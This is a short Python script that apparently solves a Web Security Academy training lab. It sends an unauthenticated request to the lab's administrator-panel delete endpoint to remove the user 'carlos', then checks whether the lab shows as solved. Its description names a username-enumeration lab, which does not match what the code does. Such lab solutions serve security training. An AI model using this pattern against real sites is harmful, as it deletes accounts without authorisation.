import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Username enumeration via different responses')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

requests.get("https://" + lab.id + ".web-security-academy.net/administrator-panel/delete?username=carlos")

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")